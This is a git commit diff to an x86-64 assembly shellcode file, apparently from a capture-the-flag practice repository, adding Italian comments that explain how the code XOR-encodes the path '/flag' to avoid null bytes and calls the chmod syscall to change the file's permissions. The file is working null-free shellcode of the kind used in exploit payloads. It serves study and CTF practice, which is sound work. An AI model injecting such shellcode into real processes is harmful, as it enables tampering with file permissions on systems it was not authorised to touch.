6bdf390a7cedc2b613204662122e35d826f4259d
Giacomo <94630562+SirFuryy@users.noreply.github.com>
2024-02-04 12:30:19 +0100

    Update chmod.s

--- ShellCode/chmod.s
+++ ShellCode/chmod.s
@@ -3,16 +3,17 @@
 .section .text
 _start:
     /* chmod(file='/flag', mode=4) */
-    /* push b'/flag\\x00' */
-    mov rax, 0x101010101010101
-    push rax
-    mov rax, 0x101010101010101 ^ 0x67616c662f
-    xor [rsp], rax
-    mov rdi, rsp
-    push 4
-    pop rsi /* call chmod() */
+    /* push b'/flag\\x00' = */
+    /* Per chiamare chmod devo settare i registri rax= numero syscall, rdi= posizione del file, rsi = modifica da apportare*/
+    mov rax, 0x101010101010101                      #carico un valore sempli in rax
+    push rax                                        #lo pusho nello stack 
+    mov rax, 0x101010101010101 ^ 0x67616c662f       #eseguo lo xor tra un valore semplice e la rappresentazione di /flag
+    xor [rsp], rax                                  #rieseguo lo xor per pulire la flag e caricarla nello stack
+    mov rdi, rsp                                    #metto la flag nel registro rdi
+    push 4                                          /* call chmod() */
+    pop rsi                                         /* rsi = 4, Indica il modo in cui convertire il file*/
     push 0x5a
-    pop rax
+    pop rax                                         /* rax = 0x5a, numero di syscall del chmod*/
     syscall
 
 
